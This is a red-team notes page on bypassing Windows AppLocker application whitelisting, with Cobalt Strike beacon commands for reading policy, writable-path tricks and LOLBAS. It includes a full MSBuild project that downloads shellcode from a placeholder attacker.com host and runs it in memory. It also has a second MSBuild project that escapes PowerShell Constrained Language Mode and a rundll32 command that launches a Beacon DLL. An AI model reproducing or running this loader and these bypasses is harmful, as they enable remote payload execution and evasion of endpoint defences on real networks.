---
title: Application Whitelisting
category: Red Team
order: 15
---

# AppLocker

AppLoker is an application whitelisting technology for Windows Operating Systems. Restricts applications ans scripts that are allowed to run on a machine, defined through a set of policies which are set by GPO.

Rules can be based on file attributes such as *name*, *version*, *hash* or *path*, and can *allow* or *deny*.

AppLocker will also change the PowerShell Language Mode from `FullLanguage` to `ConstrainedLanguage`.

## Policy Enumeration

The policy can be read from two places, directly from GPO or from the local registry of a machine. 

### Via downloading GPO

We can read the GPO by downloading the `Regitry.pol`.

```
beacon> powershell Get-DomainGPO -Domain corp.local | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

displayname gpcfilesyspath                                                                        
----------- --------------                                                                        
AppLocker   \\corp.local\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}

beacon> download \\corp.local\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
[*] started download of \\corp.local\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol (7616 bytes)
[*] download of Registry.pol is complete
```

We can parse the pol file with `Parse-PolFile` from the `GPRegistryPolicyParser` package.

* [https://github.com/PowerShell/GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)

```powershell
Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\a61c8b2c-a319-4cd0-9690-d2177cad7b51
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 700
ValueData   : <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the
              Windows folder" Description="Allows members of the Everyone group to run applications that are located
              in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition
              Path="%WINDIR%\*"/></Conditions></FilePathRule>
```

### Via local registry

We can query the registry at `HKLM:Software\Policies\Microsoft\Windows\SrpV2` to obtain the information.

```powershell
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
```

> **Note**: We can see that DLL enforcement is not commonly enabled.

```powershell
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
```

## Writeable Paths

The default rules allow execution on `C:\Program Files` and `C:\Windows` including subdirectories. So moving laterally to a protected machine via psexec is trivial since the service executable is written into `C:\Windows`.

But, if you're on a protected machine as a standard user, there are several directories inside `C:\Windows` where we can write, one for example is `C:\Windows\Tasks`. This would allow us to copy an executable into this directory and run it.

> **Note**: When enumerating the rules, we can find some additional weak rules that sysadmins have set. An example is:
>
> `<FilePathCondition Path="*\AppV\*"/>`


## LOLBAS

**Living Off The Land Binaries, Scripts and Libraries (LOLBAS)** are executables and scripts thant come as part of Windows but allow for arbitrary code execution. They allow us to bypass AppLocker, because they're allowed to execute under the normal criteia and may also be digitally signed by Microsoft.

* [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

And example is `MSBuild`, if is not blocked, it can be used to execute arbitrary C# code from a `.csproj` file. This could be turned into a basic shellcode injector.

```c#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://attacker.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

## PowerShell CLM

If you can find an AppLocker bypass to execute arbitrary code, you can also break out of PowerShell Constrained Language by using the **Unmanaged PowerShell runspace**. With Cobalt Strike is simply using `powerpick` command.

```powershell
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

```powershell
beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

This can also be done in C#.

```c#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```


## Beacon DLL

If DLL enforcement is not enabled, we can call exported functions from DLLs on disk via `rundll32`. Beacon's DLL exposes several exports including `DllMain` and `StartW`.

These can be changed in the Artifact Kit under `src-main/dllmain.def`.

```beacon
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```